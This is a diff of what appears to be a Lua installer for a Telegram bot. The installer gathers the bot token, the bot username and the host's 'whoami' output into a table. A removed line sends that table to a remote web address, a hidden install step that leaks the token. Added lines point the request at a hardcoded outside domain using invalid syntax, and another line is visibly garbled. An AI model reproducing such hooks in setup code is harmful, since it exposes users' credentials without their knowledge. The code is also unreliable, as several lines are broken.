@@ -79,7 +79,7 @@ boss..":VERSION","1.0",
 boss..":SUDO_ID:",SUDO_USER,
 boss..":DataCenter:","Amsterdam",
 boss..":UserNameBot:",BOT_User,
-boss..":ApiSource","GetUser.information.WebSite",
+boss..":ApiSource","https://alyafaevip.ml/",
 boss..":NameBot:","ياقوت",
 "TH3BOSS_INSTALL","Yes"
 )
@@ -88,7 +88,7 @@ info = {}
 info.username = '@'..GetUser.result.username
 info.userbot  = BOT_User
 info.TNBOT  = Token info.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-https.request(GetUser.information.WebSite..'/request/?insert='..JSON.encode(info))
+https.request(https://alyafaevip.ml/)
 Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close()
